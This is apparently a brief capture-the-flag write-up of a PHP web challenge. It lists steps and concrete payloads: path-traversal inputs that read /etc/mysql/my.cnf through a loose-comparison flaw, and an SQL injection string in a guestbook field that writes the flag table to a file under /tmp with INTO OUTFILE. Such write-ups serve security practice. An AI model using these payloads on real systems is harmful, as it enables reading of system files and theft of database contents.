## Vulnerability
PHP Loose Comparison
SQL Injection

## Step
1. Read mysql configuration file `/etc/mysql/my.cnf` by bruteforcing file-read system.
2. Catch that `/tmp` is writable from MySQL query
3. Dump information_schema to find table `flag` and select `flag` from `flag` into own file under `/tmp`

### Payloads
Following (Book, Auth)s are acceptable.
- (:yIs:..:tmp:payload_xxxx, 0)
- (:jzg:..:tmp:payload_xyyy, 0)
- (:POs:..:etc:mysql:my.cnf, 0)

SQL injection
- `column` field in guestbook
- `flag\` from flag into outfile '/tmp/payload_xxxx' -- `
